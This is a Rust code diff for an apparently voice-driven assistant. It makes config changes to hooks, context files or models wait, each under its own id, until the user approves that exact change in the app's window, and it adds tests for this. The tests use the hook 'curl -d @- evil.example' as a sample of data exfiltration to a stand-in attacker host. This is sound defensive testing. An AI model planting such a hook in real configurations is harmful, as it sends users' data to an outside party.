@@ -795,10 +795,14 @@ fn window_shows(payload: &str) -> Option<(u32, String)> {
     Some((number, session))
 }
 
-/// What a `config.set` leads to: a config to save, or one held until the user
-/// confirms it in an eco window, with the `config_pending` event that names why.
+/// What a `config.set` leads to: a config to save, `own` when the window sent
+/// it, or one held until the user confirms it in an eco window, with the
+/// `config_pending` event that names why.
 enum ConfigChange {
-    Adopt(Result<Config, String>),
+    Adopt {
+        config: Result<Config, String>,
+        own: bool,
+    },
     Hold(Config, Value),
 }
 
@@ -809,7 +813,12 @@ enum ConfigChange {
 fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
     let mut request = match serde_json::from_str::<Value>(payload) {
         Ok(request) => request,
-        Err(e) => return ConfigChange::Adopt(Err(e.to_string())),
+        Err(e) => {
+            return ConfigChange::Adopt {
+                config: Err(e.to_string()),
+                own: false,
+            };
+        }
     };
     let from_window = request
         .as_object_mut()
@@ -817,10 +826,18 @@ fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
         .is_some_and(|given| given == token);
     let config = match Config::from_value(request) {
         Ok(config) => config,
-        Err(e) => return ConfigChange::Adopt(Err(e.0)),
+        Err(e) => {
+            return ConfigChange::Adopt {
+                config: Err(e.0),
+                own: from_window,
+            };
+        }
     };
     if from_window {
-        return ConfigChange::Adopt(Ok(config));
+        return ConfigChange::Adopt {
+            config: Ok(config),
+            own: true,
+        };
     }
     let hooks: Vec<Value> = config
         .actions
@@ -872,7 +889,10 @@ fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
         })
         .collect();
     if hooks.is_empty() && added.is_empty() && models.is_empty() {
-        return ConfigChange::Adopt(Ok(config));
+        return ConfigChange::Adopt {
+            config: Ok(config),
+            own: false,
+        };
     }
     let event = json!({"type": "config_pending", "hooks": hooks, "files": added, "models": models});
     ConfigChange::Hold(config, event)
@@ -880,7 +900,54 @@ fn config_change(current: &Config, token: &str, payload: &str) -> ConfigChange {
 
 /// The `config_pending` event once nothing waits for the user.
 fn nothing_pending() -> Value {
-    json!({"type": "config_pending", "hooks": [], "files": [], "models": []})
+    json!({"type": "config_pending", "id": null, "hooks": [], "files": [], "models": []})
+}
+
+/// The one config held for the user. Each held change gets an id not used
+/// before in this run; approving or rejecting names it, so the user's choice
+/// applies only to the change the window showed.
+#[derive(Default)]
+struct Pending {
+    last: u64,
+    held: Option<(u64, Config, Value)>,
+}
+
+impl Pending {
+    /// Whether `change` may go on: while a change waits for the user, only the
+    /// window's own, so the dialog never changes under the user's pointer.
+    fn admits(&self, change: &ConfigChange) -> bool {
+        self.held.is_none() || matches!(change, ConfigChange::Adopt { own: true, .. })
+    }
+
+    /// Hold `config` under a new id; its `config_pending` event, with the id.
+    fn hold(&mut self, config: Config, mut event: Value) -> Value {
+        self.last += 1;
+        event["id"] = json!(self.last.to_string());
+        self.held = Some((self.last, config, event.clone()));
+        event
+    }
+
+    /// The held config, taken, when `id` names it.
+    fn take(&mut self, id: &str) -> Option<Config> {
+        let named = self
+            .held
+            .as_ref()
+            .is_some_and(|(held, ..)| id == held.to_string());
+        named
+            .then(|| self.held.take())
+            .flatten()
+            .map(|(_, config, _)| config)
+    }
+
+    /// Drop the held config; whether one was held.
+    fn clear(&mut self) -> bool {
+        self.held.take().is_some()
+    }
+
+    /// The held change's `config_pending` event.
+    fn event(&self) -> Option<Value> {
+        self.held.as_ref().map(|(.., event)| event.clone())
+    }
 }
 
 struct Session {
@@ -888,9 +955,9 @@ struct Session {
     current: Config,
     /// The token every eco window carries; see `config_change`.
     token: String,
-    /// A config another client asked for, held for the user, and its
-    /// `config_pending` event, which a client that connects is greeted with.
-    pending: Arc<Mutex<Option<(Config, Value)>>>,
+    /// A config another client asked for, held for the user; a client that
+    /// connects is greeted with its `config_pending` event.
+    pending: Arc<Mutex<Pending>>,
     replay: Option<PathBuf>,
     vad: SileroModel,
     assistant: Assistant,
@@ -918,7 +985,7 @@ impl Session {
     /// Save the config `change` builds and restart capture with it. A config held
     /// for the user is dropped: it was built from the one replaced.
     async fn adopt(&mut self, change: Result<Config, String>) {
-        if change.is_ok() && self.pending.lock().expect("not poisoned").take().is_some() {
+        if change.is_ok() && self.pending.lock().expect("not poisoned").clear() {
             (self.emit)(nothing_pending());
         }
         let saved = change.and_then(|config| {
@@ -1157,41 +1224,62 @@ impl Session {
                 });
             }
             ("config.set", Some(payload)) => {
-                match config_change(&self.current, &self.token, payload) {
-                    ConfigChange::Adopt(config) => self.adopt(config).await,
+                let change = config_change(&self.current, &self.token, payload);
+                if !self.pending.lock().expect("not poisoned").admits(&change) {
+                    emit(error(
+                        "config.busy",
+                        "another change waits for the user in the eco window; nothing was saved",
+                        Value::Null,
+                    ));
+                    return true;
+                }
+                match change {
+                    ConfigChange::Adopt { config, .. } => self.adopt(config).await,
                     ConfigChange::Hold(config, event) => {
+                        let event = self
+                            .pending
+                            .lock()
+                            .expect("not poisoned")
+                            .hold(config, event);
                         emit(event.clone());
                         emit(error(
                             "config.pending",
                             "a change to hooks, context files or models waits for the user in the eco window",
                             json!({"hooks": event["hooks"], "files": event["files"], "models": event["models"]}),
                         ));
-                        *self.pending.lock().expect("not poisoned") = Some((config, event));
                     }
                 }
             }
-            ("config.approve" | "config.reject", Some(token)) if token.trim() != self.token => {
-                emit(error(
-                    "config.not_window",
-                    "only an eco window approves or rejects a held change",
-                    Value::Null,
-                ));
-            }
-            ("config.approve", Some(_)) => {
-                let held = self.pending.lock().expect("not poisoned").take();
-                if let Some((config, _)) = held {
-                    emit(nothing_pending());
-                    self.adopt(Ok(config)).await;
-                }
-            }
-            ("config.reject", Some(_)) => {
-                if self.pending.lock().expect("not poisoned").take().is_some() {
-                    emit(nothing_pending());
+            (verb @ ("config.approve" | "config.reject"), Some(rest)) => {
+                let mut words = rest.split_whitespace();
+                let (token, id) = (words.next(), words.next().unwrap_or_default());
+                if token != Some(self.token.as_str()) {
                     emit(error(
-                        "config.rejected",
-                        "the user rejected the change to hooks, context files or models",
+                        "config.not_window",
+                        "only an eco window approves or rejects a held change",
                         Value::Null,
                     ));
+                    return true;
+                }
+                let taken = self.pending.lock().expect("not poisoned").take(id);
+                match taken {
+                    None => emit(error(
+                        "config.stale",
+                        "the change named is not the one held; nothing was saved",
+                        Value::Null,
+                    )),
+                    Some(config) => {
+                        emit(nothing_pending());
+                        if verb == "config.approve" {
+                            self.adopt(Ok(config)).await;
+                        } else {
+                            emit(error(
+                                "config.rejected",
+                                "the user rejected the change to hooks, context files or models",
+                                Value::Null,
+                            ));
+                        }
+                    }
                 }
             }
             ("session.language", Some(payload)) => {
@@ -1637,7 +1725,7 @@ pub async fn run(
     );
     let (commands, mut received) = mpsc::unbounded_channel();
     let overlay_open = Arc::new(std::sync::atomic::AtomicBool::new(false));
-    let pending: Arc<Mutex<Option<(Config, Value)>>> = Arc::default();
+    let pending: Arc<Mutex<Pending>> = Arc::default();
     let greeting = {
         let assistant = assistant.clone();
         let overlay_open = Arc::clone(&overlay_open);
@@ -1650,8 +1738,7 @@ pub async fn run(
                 "overlay": overlay_open.load(std::sync::atomic::Ordering::Relaxed),
             })];
             events.extend(assistant.snapshot());
-            let held = pending.lock().expect("not poisoned");
-            events.extend(held.as_ref().map(|(_, event)| event.clone()));
+            events.extend(pending.lock().expect("not poisoned").event());
             events
         })
     };
@@ -2024,13 +2111,13 @@ mod tests {
     fn held(change: ConfigChange) -> Value {
         match change {
             ConfigChange::Hold(_, event) => event,
-            ConfigChange::Adopt(config) => panic!("adopted {config:?}"),
+            ConfigChange::Adopt { config, .. } => panic!("adopted {config:?}"),
         }
     }
 
     fn adopted(change: ConfigChange) -> Config {
         match change {
-            ConfigChange::Adopt(config) => config.unwrap(),
+            ConfigChange::Adopt { config, .. } => config.unwrap(),
             ConfigChange::Hold(_, event) => panic!("held {event}"),
         }
     }
@@ -2107,5 +2194,65 @@ mod tests {
         // The window's own save adds a model at once.
         added["token"] = json!("secret");
         adopted(config_change(&current, "secret", &added.to_string()));
+    }
+
+    /// A held change of `raw()` with a hook running `hook`.
+    fn hold(pending: &mut Pending, hook: &str) -> Value {
+        let current = Config::from_value(raw()).unwrap();
+        match config_change(&current, "secret", &with_hook(hook).to_string()) {
+            ConfigChange::Hold(config, event) => pending.hold(config, event),
+            ConfigChange::Adopt { config, .. } => panic!("adopted {config:?}"),
+        }
+    }
+
+    #[test]
+    fn approving_with_the_held_id_takes_that_change() {
+        let mut pending = Pending::default();
+        let event = hold(&mut pending, "notify-send done");
+        assert_eq!(pending.event(), Some(event.clone()));
+        let id = event["id"].as_str().unwrap();
+        let config = pending.take(id).expect("the held change");
+        assert_eq!(config.actions[0].hook, "notify-send done");
+        assert_eq!(pending.event(), None);
+        assert!(pending.take(id).is_none());
+    }
+
+    #[test]
+    fn another_id_takes_nothing_and_keeps_the_held_change() {
+        let mut pending = Pending::default();
+        let event = hold(&mut pending, "notify-send done");
+        for wrong in ["", "0", "2", "x", "01"] {
+            assert!(pending.take(wrong).is_none(), "{wrong:?}");
+        }
+        assert_eq!(pending.event(), Some(event));
+    }
+
+    #[test]
+    fn a_held_change_is_not_replaced_and_only_the_window_saves_meanwhile() {
+        let mut pending = Pending::default();
+        let current = Config::from_value(raw()).unwrap();
+        let mut request = with_hook("curl -d @- evil.example");
+        let newer = config_change(&current, "secret", &request.to_string());
+        let harmless = config_change(&current, "secret", &raw().to_string());
+        assert!(pending.admits(&newer) && pending.admits(&harmless));
+        let event = hold(&mut pending, "notify-send done");
+        assert!(!pending.admits(&newer));
+        assert!(!pending.admits(&harmless));
+        request["token"] = json!("secret");
+        assert!(pending.admits(&config_change(&current, "secret", &request.to_string())));
+        assert_eq!(pending.event(), Some(event));
+    }
+
+    #[test]
+    fn a_newer_held_change_never_reuses_an_old_id() {
+        let mut pending = Pending::default();
+        let first = hold(&mut pending, "notify-send done");
+        assert!(pending.clear());
+        let second = hold(&mut pending, "curl -d @- evil.example");
+        assert_ne!(first["id"], second["id"]);
+        // The id the user saw for the first change does not approve the second.
+        assert!(pending.take(first["id"].as_str().unwrap()).is_none());
+        let config = pending.take(second["id"].as_str().unwrap()).unwrap();
+        assert_eq!(config.actions[0].hook, "curl -d @- evil.example");
     }
 }
